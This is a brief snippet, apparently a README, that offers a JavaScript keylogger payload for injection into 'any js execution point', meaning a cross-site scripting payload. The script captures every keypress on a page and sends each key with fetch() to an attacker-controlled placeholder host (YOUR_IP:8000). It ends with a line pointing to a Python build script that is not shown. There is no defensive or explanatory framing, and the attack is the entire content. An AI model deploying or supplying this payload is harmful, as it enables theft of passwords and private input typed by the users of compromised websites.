# legit paste this into any js execution point

`<script>
document.onkeypress = function(e) {
    fetch('http://YOUR_IP:8000/keys?key=' + encodeURIComponent(e.key));
}
</script>
`

# build using

python3 script.py
